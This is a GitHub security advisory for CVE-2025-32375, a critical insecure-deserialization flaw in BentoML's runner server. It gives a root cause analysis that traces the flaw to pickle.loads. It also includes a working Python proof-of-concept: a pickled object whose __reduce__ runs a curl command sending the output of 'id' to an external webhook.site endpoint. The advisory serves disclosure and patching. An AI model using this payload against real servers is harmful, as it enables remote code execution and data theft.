# BentoML's runner server Vulnerable to Remote Code Execution (RCE) via Insecure Deserialization

**GHSA**: GHSA-7v4r-c989-xh26 | **CVE**: CVE-2025-32375 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-502

**Affected Packages**:
- **bentoml** (pip): >= 1.0.0a1, < 1.4.8

## Description

### Summary
There was an insecure deserialization in BentoML's runner server. By setting specific headers and parameters in the POST request, it is possible to execute any unauthorized arbitrary code on the server, which will grant the attackers to have the initial access and information disclosure on the server.

### PoC
 - First, create a file named **model.py** to create a simple model and save it
```
import bentoml
import numpy as np

class mymodel:
    def predict(self, info):
        return np.abs(info)
    def __call__(self, info):
        return self.predict(info)

model = mymodel()
bentoml.picklable_model.save_model("mymodel", model)
```
- Then run the following command to save this model
```
python3 model.py
```
- Next, create **bentofile.yaml** to build this model
```
service: "service.py"  
description: "A model serving service with BentoML"  
python:
  packages:
    - bentoml
    - numpy
models:
  - tag: MyModel:latest  
include:
  - "*.py"  
```
- Then, create **service.py** to host this model
```
import bentoml
from bentoml.io import NumpyNdarray
import numpy as np


model_runner = bentoml.picklable_model.get("mymodel:latest").to_runner()

svc = bentoml.Service("myservice", runners=[model_runner])

async def predict(input_data: np.ndarray):

    input_columns = np.split(input_data, input_data.shape[1], axis=1)
    result_generator = model_runner.async_run(input_columns, is_stream=True)
    async for result in result_generator:
        yield result
```
- Then, run the following commands to build and host this model
```
bentoml build
bentoml start-runner-server --runner-name mymodel --working-dir . --host 0.0.0.0 --port 8888
```
- Finally, run this below python script to exploit insecure deserialization vulnerability in BentoML's runner server.
```
import requests
import pickle

url = "http://0.0.0.0:8888/"

headers = {
    "args-number": "1",
    "Content-Type": "application/vnd.bentoml.pickled",
    "Payload-Container": "NdarrayContainer", 
    "Payload-Meta": '{"format": "default"}',
    "Batch-Size": "-1",
}

class P:
    def __reduce__(self):
        return  (__import__('os').system, ('curl -X POST -d "$(id)" https://webhook.site/61093bfe-a006-4e9e-93e4-e201eabbb2c3',))

response = requests.post(url, headers=headers, data=pickle.dumps(P()))

print(response)
```
And I can replace the **NdarrayContainer** with **PandasDataFrameContainer** in **Payload-Container** header and the exploit still working.
After running **exploit.py** then the output of the command **id** will be send out to the WebHook server.

### Root Cause Analysis:

- When handling a request in BentoML runner server in `src/bentoml/_internal/server/runner_app.py`, when the request header `args-number` is equal to 1, it will call the function `_deserialize_single_param` like the code below:
```
https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L291-L298
async def _request_handler(request: Request) -> Response:
    assert self._is_ready

    arg_num = int(request.headers["args-number"])
    r_: bytes = await request.body()

    if arg_num == 1:
        params: Params[t.Any] = _deserialize_single_param(request, r_)
```
- Then this is the function of `_deserialize_single_param`, which will take the value of all request headers of `Payload-Container`, `Payload-Meta` and `Batch-Size` and the crafted into `Payload` class which will contain the data from `request.body`
```
https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L376-L393
def _deserialize_single_param(request: Request, bs: bytes) -> Params[t.Any]:
    container = request.headers["Payload-Container"]
    meta = json.loads(request.headers["Payload-Meta"])
    batch_size = int(request.headers["Batch-Size"])
    kwarg_name = request.headers.get("Kwarg-Name")
    payload = Payload(
        data=bs,
        meta=meta,
        batch_size=batch_size,
        container=container,
    )
    if kwarg_name:
        d = {kwarg_name: payload}
        params: Params[t.Any] = Params(**d)
    else:
        params: Params[t.Any] = Params(payload)

    return params
```
- After crafting `Params` containing payload, it will call to function `infer` with `params` variable as input
```
https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L303-L304
try:
  payload = await infer(params)
```
- Inside function `infer`, the `params` variable with is belong to class `Params` will call the function `map` of that class with `AutoContainer.from_payload` as a parameter.
```
https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L278-L289
async def infer(params: Params[t.Any]) -> Payload:
      params = params.map(AutoContainer.from_payload)

      try:
          ret = await runner_method.async_run(
              *params.args, **params.kwargs
          )
      except Exception:
          traceback.print_exc()
          raise

      return AutoContainer.to_payload(ret, 0)
```
- Inside class `Params` define the function `map` which will call the `AutoContainer.from_payload` function with arguments, which are `data`, `meta`, `batch_size` and `container`
```
https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/utils.py#L59-L66
def map(self, function: t.Callable[[T], To]) -> Params[To]:
    """
    Apply a function to all the values in the Params and return a Params of the
    return values.
    """
    args = tuple(function(a) for a in self.args)
    kwargs = {k: function(v) for k, v in self.kwargs.items()}
    return Params[To](*args, **kwargs)
```
- Inside class `AutoContainer` class have defined the function `from_payload` which will find the class by the `payload.container` , which is the value of header `Payload-Container`, and it will call the function `from_payload` from the chosen class as return value
```
https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L710-L712
def from_payload(cls, payload: Payload) -> t.Any:
    container_cls = DataContainerRegistry.find_by_name(payload.container)
    return container_cls.from_payload(payload)
```
And if the attacker set value of header `Payload-Container` to `NdarrayContainer` or `PandasDataFrameContainer`, it will call `from_payload` and when it then check if the `payload.meta["format"] == "default"` it will call `pickle.loads(payload.data)` and `payload.meta["format"]` is the value of header `Payload-Meta` and the attacker can set it to `{"format": "default"}` and `payload.data` is the value of `request.body` which is the payload from malicious `class P` in my request, which will trigger `__reduce__` method and then execute arbitrary commands (for my example is the `curl` command)
```
https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L411-L416
def from_payload(
    cls,
    payload: Payload,
) -> ext.PdDataFrame:
    if payload.meta["format"] == "default":
        return pickle.loads(payload.data)
https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L306-L312
def from_payload(
    cls,
    payload: Payload,
) -> ext.NpNDArray:
    format = payload.meta.get("format", "default")
    if format == "default":
        return pickle.loads(payload.data)
```
### Impact
In the above Proof of Concept, I have shown how the attacker can execute command **id** and send the output of the command to the outside. By replacing **id** command with any OS commands, this insecure deserialization in BentoML's runner server will grant the attacker the permission to gain the remote shell on the server and injecting backdoors to persist access.
